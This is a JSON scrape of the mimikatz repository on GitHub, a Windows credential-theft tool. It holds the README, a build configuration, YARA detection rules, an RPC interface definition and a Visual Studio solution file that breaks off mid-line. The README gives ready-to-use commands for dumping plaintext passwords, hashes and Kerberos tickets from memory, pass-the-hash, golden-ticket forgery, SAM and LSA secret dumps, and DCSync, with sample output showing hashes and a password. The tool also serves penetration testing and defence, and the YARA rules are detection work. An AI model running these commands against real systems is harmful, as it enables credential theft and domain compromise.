{
  "metadata": {
    "timestamp": 1736710397241,
    "page": 16,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjIw",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "gentilkiwi/mimikatz",
      "stars": 19680,
      "defaultBranch": "master",
      "files": [
        {
          "name": "README.md",
          "type": "blob",
          "size": 5.0888671875,
          "content": "# mimikatz\n\n**`mimikatz`** is a tool I've made to learn `C` and make somes experiments with Windows security.\n\nIt's now well known to extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. **`mimikatz`** can also perform pass-the-hash, pass-the-ticket or build _Golden tickets_.\n\n```\n  .#####.   mimikatz 2.0 alpha (x86) release \"Kiwi en C\" (Apr  6 2014 22:02:03)\n .## ^ ##.\n ## / \\ ##  /* * *\n ## \\ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n '## v ##'   https://blog.gentilkiwi.com/mimikatz             (oe.eo)\n  '#####'                                    with  13 modules * * */\n\n\nmimikatz # privilege::debug\nPrivilege '20' OK\n \nmimikatz # sekurlsa::logonpasswords\n \nAuthentication Id : 0 ; 515764 (00000000:0007deb4)\nSession           : Interactive from 2\nUser Name         : Gentil Kiwi\nDomain            : vm-w7-ult-x\nSID               : S-1-5-21-1982681256-1210654043-1600862990-1000\n        msv :\n         [00000003] Primary\n         * Username : Gentil Kiwi\n         * Domain   : vm-w7-ult-x\n         * LM       : d0e9aee149655a6075e4540af1f22d3b\n         * NTLM     : cc36cf7a8514893efccd332446158b1a\n         * SHA1     : a299912f3dc7cf0023aef8e4361abfc03e9a8c30\n        tspkg :\n         * Username : Gentil Kiwi\n         * Domain   : vm-w7-ult-x\n         * Password : waza1234/\n...\n```\nBut that's not all! `Crypto`, `Terminal Server`, `Events`, ... lots of informations in the GitHub Wiki https://github.com/gentilkiwi/mimikatz/wiki or on https://blog.gentilkiwi.com (in French, _yes_).\n\nIf you don't want to build it, binaries are availables on https://github.com/gentilkiwi/mimikatz/releases\n\n\n## Quick usage\n```\nlog\nprivilege::debug\n```\n\n### sekurlsa\n```\nsekurlsa::logonpasswords\nsekurlsa::tickets /export\n\nsekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd\n```\n\n### kerberos\n```\nkerberos::list /export\nkerberos::ptt c:\\chocolate.kirbi\n\nkerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi\n```\n\n### crypto\n```\ncrypto::capi\ncrypto::cng\n\ncrypto::certificates /export\ncrypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE\n\ncrypto::keys /export\ncrypto::keys /machine /export\n```\n\n### vault & lsadump\n```\nvault::cred\nvault::list\n\ntoken::elevate\nvault::cred\nvault::list\nlsadump::sam\nlsadump::secrets\nlsadump::cache\ntoken::revert\n\nlsadump::dcsync /user:domain\\krbtgt /domain:lab.local\n```\n\n## Build\n`mimikatz` is in the form of a Visual Studio Solution and a WinDDK driver (optional for main operations), so prerequisites are:\n* for `mimikatz` and `mimilib` : Visual Studio 2010, 2012 or 2013 for Desktop (**2013 Express for Desktop is free and supports x86 & x64** - http://www.microsoft.com/download/details.aspx?id=44914)\n* _for `mimikatz driver`, `mimilove` (and `ddk2003` platform) : Windows Driver Kit **7.1** (WinDDK) - http://www.microsoft.com/download/details.aspx?id=11800_\n\n`mimikatz` uses `SVN` for source control, but is now available with `GIT` too!\nYou can use any tools you want to sync, even incorporated `GIT` in Visual Studio 2013 =)\n\n### Synchronize!\n* GIT URL is  : https://github.com/gentilkiwi/mimikatz.git\n* SVN URL is  : https://github.com/gentilkiwi/mimikatz/trunk\n* ZIP file is : https://github.com/gentilkiwi/mimikatz/archive/master.zip\n\n### Build the solution\n* After opening the solution, `Build` / `Build Solution` (you can change architecture)\n* `mimikatz` is now built and ready to be used! (`Win32` / `x64` even `ARM64` if you're lucky)\n  * you can have error `MSB3073` about `_build_.cmd` and `mimidrv`, it's because the driver cannot be build without Windows Driver Kit **7.1** (WinDDK), but `mimikatz` and `mimilib` are OK.\n\n### ddk2003\nWith this optional MSBuild platform, you can use the WinDDK build tools, and the default `msvcrt` runtime (smaller binaries, no dependencies)\n\nFor this optional platform, Windows Driver Kit **7.1** (WinDDK) - http://www.microsoft.com/download/details.aspx?id=11800 and Visual Studio **2010** are mandatory, even if you plan to use Visual Studio 2012 or 2013 after.\n\nFollow instructions:\n* https://blog.gentilkiwi.com/programmation/executables-runtime-defaut-systeme\n* _https://blog.gentilkiwi.com/cryptographie/api-systemfunction-windows#winheader_\n\n## Continuous Integration\n`mimikatz` project is available on AppVeyor - https://ci.appveyor.com/project/gentilkiwi/mimikatz\n\nIts status is: ![AppVeyor CI status](https://ci.appveyor.com/api/projects/status/github/gentilkiwi/mimikatz?svg=true&retina=true)\n\n## Licence\nCC BY 4.0 licence - https://creativecommons.org/licenses/by/4.0/\n\n`mimikatz` needs coffee to be developed:\n* PayPal: https://www.paypal.me/delpy/\n\n## Author\n* Benjamin DELPY `gentilkiwi`, you can contact me on Twitter ( @gentilkiwi ) or by mail ( benjamin [at] gentilkiwi.com )\n* DCSync and DCShadow functions in `lsadump` module were co-writed with Vincent LE TOUX, you can contact him by mail ( vincent.letoux [at] gmail.com ) or visit his website ( http://www.mysmartlogon.com )\n\nThis is a **personal** development, please respect its philosophy and don't use it for bad things!"
        },
        {
          "name": "appveyor.yml",
          "type": "blob",
          "size": 1.162109375,
          "content": "version: 2.2.0-ci-{branch}-{build}\r\nimage: Visual Studio 2013\r\nconfiguration: Release\r\nplatform:\r\n- x64\r\n- Win32\r\nshallow_clone: true\r\nbefore_build:\r\n- ps: (Get-Content \"C:\\Program Files (x86)\\Microsoft SDKs\\Windows\\v7.1A\\Include\\ntsecapi.h\") | %{$_ -replace \"^RtlDecryptMemory\\($\", \"__stdcall RtlDecryptMemory(\"} | Set-Content \"C:\\Program Files (x86)\\Microsoft SDKs\\Windows\\v7.1A\\Include\\ntsecapi.h\"\r\nbuild:\r\n  parallel: true\r\n  verbosity: normal\r\nafter_build:\r\n- cmd: >-\r\n    7z a -t7z -mx -ms=on %APPVEYOR_PROJECT_NAME%_trunk_%PLATFORM%.7z -xr@notrunk.lst .\\%PLATFORM% README.md kiwi_passwords.yar mimicom.idl\r\n\r\n    7z a -tzip -mx -mm=deflate -mpass=15 %APPVEYOR_PROJECT_NAME%_trunk_%PLATFORM%.zip -xr@notrunk.lst .\\%PLATFORM% README.md kiwi_passwords.yar mimicom.idl\r\n\r\n    7z a -p%APPVEYOR_PROJECT_NAME% -mhe=on -t7z -mx -ms=on %APPVEYOR_PROJECT_NAME%_trunk_password_%PLATFORM%.7z -xr@notrunk.lst .\\%PLATFORM% README.md kiwi_passwords.yar mimicom.idl\r\n\r\n    7z a -p%APPVEYOR_PROJECT_NAME% -tzip -mx -mm=deflate -mpass=15 %APPVEYOR_PROJECT_NAME%_trunk_password_%PLATFORM%.zip -xr@notrunk.lst .\\%PLATFORM% README.md kiwi_passwords.yar mimicom.idl\r\nartifacts:\r\n- path: mimikatz_trunk_*\r\n"
        },
        {
          "name": "inc",
          "type": "tree",
          "content": null
        },
        {
          "name": "kiwi_passwords.yar",
          "type": "blob",
          "size": 2.767578125,
          "content": "/*\tBenjamin DELPY `gentilkiwi`\r\n\thttps://blog.gentilkiwi.com\r\n\tbenjamin@gentilkiwi.com\r\n\tLicence : https://creativecommons.org/licenses/by/4.0/\r\n*/\r\nrule mimikatz\r\n{\r\n\tmeta:\r\n\t\tdescription\t\t= \"mimikatz\"\r\n\t\tauthor\t\t\t= \"Benjamin DELPY (gentilkiwi)\"\r\n\t\ttool_author\t\t= \"Benjamin DELPY (gentilkiwi)\"\r\n\r\n\tstrings:\r\n\t\t$exe_x86_1\t\t= { 89 71 04 89 [0-3] 30 8d 04 bd }\r\n\t\t$exe_x86_2\t\t= { 8b 4d e? 8b 45 f4 89 75 e? 89 01 85 ff 74 }\r\n\t\t\r\n\t\t$exe_x64_1\t\t= { 33 ff 4? 89 37 4? 8b f3 45 85 c? 74}\r\n\t\t$exe_x64_2\t\t= { 4c 8b df 49 [0-3] c1 e3 04 48 [0-3] 8b cb 4c 03 [0-3] d8 }\r\n\r\n\t\t$dll_1\t\t\t= { c7 0? 00 00 01 00 [4-14] c7 0? 01 00 00 00 }\r\n\t\t$dll_2\t\t\t= { c7 0? 10 02 00 00 ?? 89 4? }\r\n\t\t\r\n\t\t$sys_x86\t\t= { a0 00 00 00 24 02 00 00 40 00 00 00 [0-4] b8 00 00 00 6c 02 00 00 40 00 00 00 }\r\n\t\t$sys_x64\t\t= { 88 01 00 00 3c 04 00 00 40 00 00 00 [0-4] e8 02 00 00 f8 02 00 00 40 00 00 00 }\r\n\r\n\tcondition:\r\n\t\t(all of ($exe_x86_*)) or (all of ($exe_x64_*)) or (all of ($dll_*)) or (any of ($sys_*))\r\n}\r\n\r\n\r\nrule mimikatz_lsass_mdmp\r\n{\r\n\tmeta:\r\n\t\tdescription\t\t= \"LSASS minidump file for mimikatz\"\r\n\t\tauthor\t\t\t= \"Benjamin DELPY (gentilkiwi)\"\r\n\r\n\tstrings:\r\n\t\t$lsass\t\t\t= \"System32\\\\lsass.exe\"\twide nocase\r\n\r\n\tcondition:\r\n\t\t(uint32(0) == 0x504d444d) and $lsass\r\n}\r\n\r\n\r\nrule mimikatz_kirbi_ticket\r\n{\r\n\tmeta:\r\n\t\tdescription\t\t= \"KiRBi ticket for mimikatz\"\r\n\t\tauthor\t\t\t= \"Benjamin DELPY (gentilkiwi)\"\r\n\r\n\tstrings:\r\n\t\t$asn1\t\t\t= { 76 82 ?? ?? 30 82 ?? ?? a0 03 02 01 05 a1 03 02 01 16 }\r\n\r\n\tcondition:\r\n\t\t$asn1 at 0\r\n}\r\n\r\n\r\nrule wce\r\n{\r\n\tmeta:\r\n\t\tdescription\t\t= \"wce\"\r\n\t\tauthor\t\t\t= \"Benjamin DELPY (gentilkiwi)\"\r\n\t\ttool_author\t\t= \"Hernan Ochoa (hernano)\"\r\n\r\n\tstrings:\r\n\t\t$hex_legacy\t\t= { 8b ff 55 8b ec 6a 00 ff 75 0c ff 75 08 e8 [0-3] 5d c2 08 00 }\r\n\t\t$hex_x86\t\t= { 8d 45 f0 50 8d 45 f8 50 8d 45 e8 50 6a 00 8d 45 fc 50 [0-8] 50 72 69 6d 61 72 79 00 }\r\n\t\t$hex_x64\t\t= { ff f3 48 83 ec 30 48 8b d9 48 8d 15 [0-16] 50 72 69 6d 61 72 79 00 }\r\n\r\n\tcondition:\r\n\t\tany of them\r\n}\r\n\r\n\r\nrule lsadump\r\n{\r\n\tmeta:\r\n\t\tdescription\t\t= \"LSA dump programe (bootkey/syskey) - pwdump and others\"\r\n\t\tauthor\t\t\t= \"Benjamin DELPY (gentilkiwi)\"\r\n\r\n\tstrings:\r\n\t\t$str_sam_inc\t= \"\\\\Domains\\\\Account\" ascii nocase\r\n\t\t$str_sam_exc\t= \"\\\\Domains\\\\Account\\\\Users\\\\Names\\\\\" ascii nocase\r\n\t\t$hex_api_call\t= {(41 b8 | 68) 00 00 00 02 [0-64] (68 | ba) ff 07 0f 00 }\r\n\t\t$str_msv_lsa\t= { 4c 53 41 53 52 56 2e 44 4c 4c 00 [0-32] 6d 73 76 31 5f 30 2e 64 6c 6c 00 }\r\n\t\t$hex_bkey\t\t= { 4b 53 53 4d [20-70] 05 00 01 00}\r\n\r\n\tcondition:\r\n\t\t($str_sam_inc and not $str_sam_exc) or $hex_api_call or $str_msv_lsa or $hex_bkey\r\n}\r\n\r\nrule power_pe_injection\r\n{\r\n\tmeta:\r\n\t\tdescription\t\t= \"PowerShell with PE Reflective Injection\"\r\n\t\tauthor\t\t\t= \"Benjamin DELPY (gentilkiwi)\"\r\n\r\n\tstrings:\r\n\t\t$str_loadlib\t= \"0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9\"\r\n\t\t\r\n\tcondition:\r\n\t\t$str_loadlib\r\n}"
        },
        {
          "name": "lib",
          "type": "tree",
          "content": null
        },
        {
          "name": "mimicom.idl",
          "type": "blob",
          "size": 2.783203125,
          "content": "import \"ms-dtyp.idl\";\r\n[\r\n   uuid(17FC11E9-C258-4B8D-8D07-2F4125156244),\r\n   version(1.0)\r\n]\r\ninterface MimiCom\r\n{\r\n\ttypedef [context_handle] void* MIMI_HANDLE;\r\n\r\n\ttypedef unsigned int ALG_ID;\r\n\ttypedef struct _MIMI_PUBLICKEY {\r\n\t\tALG_ID sessionType;\r\n\t\tDWORD cbPublicKey;\r\n\t\t[size_is(cbPublicKey)] BYTE *pbPublicKey;\r\n\t} MIMI_PUBLICKEY, *PMIMI_PUBLICKEY;\r\n\t\t\r\n\tNTSTATUS MimiBind(\r\n\t\t[in] handle_t rpc_handle,\r\n\t\t[in, ref] PMIMI_PUBLICKEY clientPublicKey,\r\n\t\t[out, ref] PMIMI_PUBLICKEY serverPublicKey,\r\n\t\t[out, ref] MIMI_HANDLE *phMimi\r\n\t);\r\n\t\r\n\tNTSTATUS MiniUnbind(\r\n\t\t[in, out, ref] MIMI_HANDLE *phMimi\r\n\t);\r\n\r\n\tNTSTATUS MimiCommand(\r\n\t\t[in, ref] MIMI_HANDLE phMimi,\r\n\t\t[in] DWORD szEncCommand,\r\n\t\t[in, size_is(szEncCommand), unique] BYTE *encCommand,\r\n\t\t[out, ref] DWORD *szEncResult,\r\n\t\t[out, size_is(, *szEncResult)] BYTE **encResult\r\n\t);\r\n\r\n\tNTSTATUS MimiClear(\r\n\t\t[in] handle_t rpc_handle,\r\n\t\t[in, string] wchar_t *command,\r\n\t\t[out] DWORD *size,\r\n\t\t[out, size_is(, *size)] wchar_t **result\r\n\t);\r\n}\r\n\r\n// Privacy of RPC exchange can be ~guaranteed by protocol, *except when not using authentication*\r\n// mimikatz try to avoid clear credentials on the network by using basic encryption at application level.\r\n//\r\n// Diffie-Hellman key exchange\r\n// ===========================\r\n//\r\n// > Parameters used: Second Oakley Group ( https://tools.ietf.org/html/rfc2409#section-6.2 )\r\n// \r\n// * ALG_ID sessionType\r\n//   session key type to use after DH exchange, it can be: CALG_CYLINK_MEK(0x660c), CALG_RC2(0x6602), CALG_RC4(0x6801), CALG_DES(0x6601), CALG_3DES_112(0x6609) or CALG_3DES(0x6603)\r\n//   see: https://msdn.microsoft.com/library/windows/desktop/bb394802.aspx and https://msdn.microsoft.com/library/windows/desktop/aa375549.aspx\r\n//\r\n// * DWORD cbPublicKey\r\n//   size of pbPublicKey: 144 (sizeof(PUBLICKEYSTRUC) + sizeof(DHPUBKEY) + sizeof(1024bits key)\r\n//\r\n// * BYTE *pbPublicKey\r\n//   PUBLICKEYBLOB structure of the DH key ( https://msdn.microsoft.com/en-us/library/windows/desktop/aa381970(v=vs.85).aspx#code-snippet-1 )\r\n//\r\n//   Example:\r\n//   --------\r\n//   06 02 00 00\tPUBLICKEYBLOB (06), CUR_BLOB_VERSION (02), reserved (00 00)\r\n//   02 aa 00 00\tALG_ID: CALG_DH_EPHEM(0xaa02)\r\n//\r\n//   00 44 48 31\tMagic : \\0DH1\r\n//   00 04 00 00\t1024bits (128bytes bellow)\r\n//   a9 90 e8 86 59 2d 88 a7 32 e1 05 35 26 24 d9 fd\r\n//   ae f5 53 46 ca a4 79 cc a9 a3 57 45 e8 54 e7 fd\r\n//   fe 99 24 df 71 6a 44 2c f7 0a 09 ac e4 e6 44 f8\r\n//   4c 51 63 c3 86 1e 14 4a 9a f0 e0 a9 e0 38 26 72\r\n//   75 27 cb 60 9f 0d 15 2c 37 39 a0 b0 72 b6 14 85\r\n//   5f 18 7f c0 0d 26 d1 3b 6f 14 c1 99 22 8f 74 ef\r\n//   68 0c 24 bb 77 ff b3 c5 9e ed ff 76 71 c1 ee ce\r\n//   eb 77 46 00 52 d8 4c 5c bc af fd 28 3d 76 83 b3\r\n//\r\n// > Don't forget you may need to reverse some key bytearrays from Windows point of view, and to reset session key state between calls ;)"
        },
        {
          "name": "mimidrv",
          "type": "tree",
          "content": null
        },
        {
          "name": "mimikatz.sln",
          "type": "blob",
          "size": 10.3994140625,
          "content": "﻿\r\nMicrosoft Visual Studio Solution File, Format Version 12.00\r\n# Visual Studio 2012\r\nProject(\"{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}\") = \"mimikatz\", \"mimikatz\\mimikatz.vcxproj\", \"{FB9B5E61-7C34-4280-A211-E979E1D6977F}\"\r\nEndProject\r\nProject(\"{2150E333-8FDC-42A3-9474-1A3956D46DE8}\") = \"global files\", \"global files\", \"{1ADABD33-DEBE-4095-8EAE-9B6ED51DB68E}\"\r\n\tProjectSection(SolutionItems) = preProject\r\n\t\tappveyor.yml = appveyor.yml\r\n\t\tkiwi_passwords.yar = kiwi_passwords.yar\r\n\t\tmimicom.idl = mimicom.idl\r\n\t\tnotrunk.lst = notrunk.lst\r\n\t\tREADME.md = README.md\r\n\t\ttrunk.lst = trunk.lst\r\n\tEndProjectSection\r\nEndProject\r\nProject(\"{2150E333-8FDC-42A3-9474-1A3956D46DE8}\") = \"inc\", \"inc\", \"{282B4B77-BFF6-4DCA-9A60-6F4036929AEE}\"\r\n\tProjectSection(SolutionItems) = preProject\r\n\t\tinc\\cardmod.h = inc\\cardmod.h\r\n\t\tinc\\DbgHelp.h = inc\\DbgHelp.h\r\n\t\tinc\\DhcpSSdk.h = inc\\DhcpSSdk.h\r\n\t\tinc\\DsGetDC.h = inc\\DsGetDC.h\r\n\t\tinc\\Fci.h = inc\\Fci.h\r\n\t\tinc\\fltUser.h = inc\\fltUser.h\r\n\t\tinc\\fltUserStructures.h = inc\\fltUserStructures.h\r\n\t\tinc\\globals.h = inc\\globals.h\r\n\t\tinc\\Midles.h = inc\\Midles.h\r\n\t\tinc\\msasn1.h = inc\\msasn1.h\r\n\t\tinc\\NTSecPKG.h = inc\\NTSecPKG.h\r\n\t\tinc\\PshPack8.h = inc\\PshPack8.h\r\n\t\tinc\\schannel.h = inc\\schannel.h\r\n\t\tinc\\schnlsp.h = inc\\schnlsp.h\r\n\t\tinc\\SubAuth.h = inc\\SubAuth.h\r\n\t\tinc\\WDBGEXTS.H = inc\\WDBGEXTS.H\r\n\t\tinc\\WinBer.h = inc\\WinBer.h\r\n\t\tinc\\wincred.h = inc\\wincred.h\r\n\t\tinc\\WinDNS.h = inc\\WinDNS.h\r\n\t\tinc\\Winldap.h = inc\\Winldap.h\r\n\tEndProjectSection\r\nEndProject\r\nProject(\"{2150E333-8FDC-42A3-9474-1A3956D46DE8}\") = \"lib\", \"lib\", \"{294B51F3-90EF-4F0A-BB04-20321A513A4F}\"\r\nEndProject\r\nProject(\"{2150E333-8FDC-42A3-9474-1A3956D46DE8}\") = \"Win32\", \"Win32\", \"{96078881-DEC1-4EF5-A24A-A81AC007809D}\"\r\n\tProjectSection(SolutionItems) = preProject\r\n\t\tlib\\Win32\\advapi32.hash.lib = lib\\Win32\\advapi32.hash.lib\r\n\t\tlib\\Win32\\bcrypt.lib = lib\\Win32\\bcrypt.lib\r\n\t\tlib\\Win32\\cryptdll.lib = lib\\Win32\\cryptdll.lib\r\n\t\tlib\\Win32\\fltlib.lib = lib\\Win32\\fltlib.lib\r\n\t\tlib\\Win32\\hid.lib = lib\\Win32\\hid.lib\r\n\t\tlib\\Win32\\msasn1.min.lib = lib\\Win32\\msasn1.min.lib\r\n\t\tlib\\Win32\\ncrypt.lib = lib\\Win32\\ncrypt.lib\r\n\t\tlib\\Win32\\netapi32.min.lib = lib\\Win32\\netapi32.min.lib\r\n\t\tlib\\Win32\\ntdll.min.lib = lib\\Win32\\ntdll.min.lib\r\n\t\tlib\\Win32\\samlib.lib = lib\\Win32\\samlib.lib\r\n\t\tlib\\Win32\\winsta.lib = lib\\Win32\\winsta.lib\r\n\tEndProjectSection\r\nEndProject\r\nProject(\"{2150E333-8FDC-42A3-9474-1A3956D46DE8}\") = \"x64\", \"x64\", \"{E9D1619F-D4A1-4AFA-B261-B01091EB8D56}\"\r\n\tProjectSection(SolutionItems) = preProject\r\n\t\tlib\\x64\\advapi32.hash.lib = lib\\x64\\advapi32.hash.lib\r\n\t\tlib\\x64\\bcrypt.lib = lib\\x64\\bcrypt.lib\r\n\t\tlib\\x64\\cryptdll.lib = lib\\x64\\cryptdll.lib\r\n\t\tlib\\x64\\fltlib.lib = lib\\x64\\fltlib.lib\r\n\t\tlib\\x64\\hid.lib = lib\\x64\\hid.lib\r\n\t\tlib\\x64\\msasn1.min.lib = lib\\x64\\msasn1.min.lib\r\n\t\tlib\\x64\\ncrypt.lib = lib\\x64\\ncrypt.lib\r\n\t\tlib\\x64\\netapi32.min.lib = lib\\x64\\netapi32.min.lib\r\n\t\tlib\\x64\\ntdll.min.lib = lib\\x64\\ntdll.min.lib\r\n\t\tlib\\x64\\samlib.lib = lib\\x64\\samlib.lib\r\n\t\tlib\\x64\\winsta.lib = lib\\x64\\winsta.lib\r\n\tEndProjectSection\r\nEndProject\r\nProject(\"{2150E333-8FDC-42A3-9474-1A3956D46DE8}\") = \"arm64\", \"arm64\", \"{2FC87C8A-79C0-407D-A022-A13E793C2BC1}\"\r\n\tProjectSection(SolutionItems) = preProject\r\n\t\tlib\\arm64\\advapi32.hash.lib = lib\\arm64\\advapi32.hash.lib\r\n\t\tlib\\arm64\\msasn1.min.lib = lib\\arm64\\msasn1.min.lib\r\n\t\tlib\\arm64\\netapi32.min.lib = lib\\arm64\\netapi32.min.lib\r\n\t\tlib\\arm64\\ntdll.min.lib = lib\\arm64\\ntdll.min.lib\r\n\tEndProjectSection\r\nEndProject\r\nProject(\"{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}\") = \"mimilib\", \"mimilib\\mimilib.vcxproj\", \"{E049487C-C5BD-471E-99AE-C756E70B6520}\"\r\nEndProject\r\nProject(\"{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}\") = \"mimidrv\", \"mimidrv\\mimidrv.vcxproj\", \"{86FF6D04-208C-442F-B27C-E4255DD39402}\"\r\nEndProject\r\nProject(\"{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}\") = \"mimilove\", \"mimilove\\mimilove.vcxproj\", \"{60D02E32-1711-4D9E-9AC2-10627C52EB40}\"\r\nEndProject\r\nProject(\"{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}\") = \"mimispool\", \"mimispool\\mimispool.vcxproj\", \"{0BD5DE6B-8DA5-4CF1-AE53-A265010F52AA}\"\r\nEndProject\r\nGlobal\r\n\tGlobalSection(SubversionScc) = preSolution\r\n\t\tSvn-Managed = True\r\n\t\tManager = AnkhSVN - Subversion Support for Visual Studio\r\n\tEndGlobalSection\r\n\tGlobalSection(SolutionConfigurationPlatforms) = preSolution\r\n\t\tRelease|ARM64 = Release|ARM64\r\n\t\tRelease|Win32 = Release|Win32\r\n\t\tRelease|x64 = Release|x64\r\n\t\tSecond_Release_PowerShell|ARM64 = Second_Release_PowerShell|ARM64\r\n\t\tSecond_Release_PowerShell|Win32 = Second_Release_PowerShell|Win32\r\n\t\tSecond_Release_PowerShell|x64 = Second_Release_PowerShell|x64\r\n\t\tSimple_DLL|ARM64 = Simple_DLL|ARM64\r\n\t\tSimple_DLL|Win32 = Simple_DLL|Win32\r\n\t\tSimple_DLL|x64 = Simple_DLL|x64\r\n\tEndGlobalSection\r\n\tGlobalSection(ProjectConfigurationPlatforms) = postSolution\r\n\t\t{FB9B5E61-7C34-4280-A211-E979E1D6977F}.Release|ARM64.ActiveCfg = Release|Win32\r\n\t\t{FB9B5E61-7C34-4280-A211-E979E1D6977F}.Release|Win32.ActiveCfg = Release|Win32\r\n\t\t{FB9B5E61-7C34-4280-A211-E979E1D6977F}.Release|Win32.Build.0 = Release|Win32\r\n\t\t{FB9B5E61-7C34-4280-A211-E979E1D6977F}.Release|x64.ActiveCfg = Release|x64\r\n\t\t{FB9B5E61-7C34-4280-A211-E979E1D6977F}.Release|x64.Build.0 = Release|x64\r\n\t\t{FB9B5E61-7C34-4280-A211-E979E1D6977F}.Second_Release_PowerShell|ARM64.ActiveCfg = Second_Release_PowerShell|Win32\r\n\t\t{FB9B5E61-7C34-4280-A211-E979E1D6977F}.Second_Release_PowerShell|Win32.ActiveCfg = Second_Release_PowerShell|Win32\r\n\t\t{FB9B5E61-7C34-4280-A211-E979E1D6977F}.Second_Release_PowerShell|Win32.Build.0 = Second_Release_PowerShell|Win32\r\n\t\t{FB9B5E61-7C34-4280-A211-E979E1D6977F}.Second_Release_PowerShell|x64.ActiveCfg = Second_Release_PowerShell|x64\r\n\t\t{FB9B5E61-7C34-4280-A211-E979E1D6977F}.Second_Release_PowerShell|x64.Build.0 = Second_Release_PowerShell|x64\r\n\t\t{FB9B5E61-7C34-4280-A211-E979E1D6977F}.Simple_DLL|ARM64.ActiveCfg = Simple_DLL|Win32\r\n\t\t{FB9B5E61-7C34-4280-A211-E979E1D6977F}.Simple_DLL|Win32.ActiveCfg = Simple_DLL|Win32\r\n\t\t{FB9B5E61-7C34-4280-A211-E979E1D6977F}.Simple_DLL|Win32.Build.0 = Simple_DLL|Win32\r\n\t\t{FB9B5E61-7C34-4280-A211-E979E1D6977F}.Simple_DLL|x64.ActiveCfg = Simple_DLL|x64\r\n\t\t{FB9B5E61-7C34-4280-A211-E979E1D6977F}.Simple_DLL|x64.Build.0 = Simple_DLL|x64\r\n\t\t{E049487C-C5BD-471E-99AE-C756E70B6520}.Release|ARM64.ActiveCfg = Release|Win32\r\n\t\t{E049487C-C5BD-471E-99AE-C756E70B6520}.Release|Win32.ActiveCfg = Release|Win32\r\n\t\t{E049487C-C5BD-471E-99AE-C756E70B6520}.Release|Win32.Build.0 = Release|Win32\r\n\t\t{E049487C-C5BD-471E-99AE-C756E70B6520}.Release|x64.ActiveCfg = Release|x64\r\n\t\t{E049487C-C5BD-471E-99AE-C756E70B6520}.Release|x64.Build.0 = Release|x64\r\n\t\t{E049487C-C5BD-471E-99AE-C756E70B6520}.Second_Release_PowerShell|ARM64.ActiveCfg = Release|Win32\r\n\t\t{E049487C-C5BD-471E-99AE-C756E70B6520}.Second_Release_PowerShell|Win32.ActiveCfg = Release|Win32\r\n\t\t{E049487C-C5BD-471E-99AE-C756E70B6520}.Second_Release_PowerShell|x64.ActiveCfg = Release|x64\r\n\t\t{E049487C-C5BD-471E-99AE-C756E70B6520}.Simple_DLL|ARM64.ActiveCfg = Release|Win32\r\n\t\t{E049487C-C5BD-471E-99AE-C756E70B6520}.Simple_DLL|Win32.ActiveCfg = Release|Win32\r\n\t\t{E049487C-C5BD-471E-99AE-C756E70B6520}.Simple_DLL|x64.ActiveCfg = Release|x64\r\n\t\t{86FF6D04-208C-442F-B27C-E4255DD39402}.Release|ARM64.ActiveCfg = Release|Win32\r\n\t\t{86FF6D04-208C-442F-B27C-E4255DD39402}.Release|Win32.ActiveCfg = Release|Win32\r\n\t\t{86FF6D04-208C-442F-B27C-E4255DD39402}.Release|Win32.Build.0 = Release|Win32\r\n\t\t{86FF6D04-208C-442F-B27C-E4255DD39402}.Release|x64.ActiveCfg = Release|x64\r\n\t\t{86FF6D04-208C-442F-B27C-E4255DD39402}.Release|x64.Build.0 = Release|x64\r\n\t\t{86FF6D04-208C-442F-B27C-E4255DD39402}.Second_Release_PowerShell|ARM64.ActiveCfg = Release|Win32\r\n\t\t{86FF6D04-208C-442F-B27C-E4255DD39402}.Second_Release_PowerShell|Win32.ActiveCfg = Release|Win32\r\n\t\t{86FF6D04-208C-442F-B27C-E4255DD39402}.Second_Release_PowerShell|x64.ActiveCfg = Release|x64\r\n\t\t{86FF6D04-208C-442F-B27C-E4255DD39402}.Simple_DLL|ARM64.ActiveCfg = Release|Win32\r\n\t\t{86FF6D04-208C-442F-B27C-E4255DD39402}.Simple_DLL|Win32.ActiveCfg = Release|Win32\r\n\t\t{86FF6D04-208C-442F-B27C-E4255DD39402}.Simple_DLL|x64.ActiveCfg = Release|x64\r\n\t\t{60D02E32-1711-4D9E-9AC2-10627C52EB40}.Release|ARM64.ActiveCfg = Release|Win32\r\n\t\t{60D02E32-1711-4D9E-9AC2-10627C52EB40}.Release|Win32.ActiveCfg = Release|Win32\r\n\t\t{60D02E32-1711-4D9E-9AC2-10627C52EB40}.Release|Win32.Build.0 = Release|Win32\r\n\t\t{60D02E32-1711-4D9E-9AC2-10627C52EB40}.Release|x64.ActiveCfg = Release|x64\r\n\t\t{60D02E32-1711-4D9E-9AC2-10627C52EB40}.Second_Release_PowerShell|ARM64.ActiveCfg = Release|Win32\r\n\t\t{60D02E32-1711-4D9E-9AC2-10627C52EB40}.Second_Release_PowerShell|Win32.ActiveCfg = Release|Win32\r\n\t\t{60D02E32-1711-4D9E-9AC2-10627C52EB40}.Second_Release_PowerShell|x64.ActiveCfg = Release|x64\r\n\t\t{60D02E32-1711-4D9E-9AC2-10627C52EB40}.Simple_DLL|ARM64.ActiveCfg = Release|Win32\r\n\t\t{60D02E32-1711-4D9E-9AC2-10627C52EB40}.Simple_DLL|Win32.ActiveCfg = Release|Win32\r\n\t\t{60D02E32-1711-4D9E-9AC2-10627C52EB40}.Simple_DLL|x64.ActiveCfg = Release|x64\r\n\t\t{0BD5DE6B-8DA5-4CF1-AE53-A265010F52AA}.Release|ARM64.ActiveCfg = Release|Win32\r\n\t\t{0BD5DE6B-8DA5-4CF1-AE53-A265010F52AA}.Release|Win32.ActiveCfg = Release|Win32\r\n\t\t{0BD5DE6B-8DA5-4CF1-AE53-A265010F52AA}.Release|Win32.Build.0 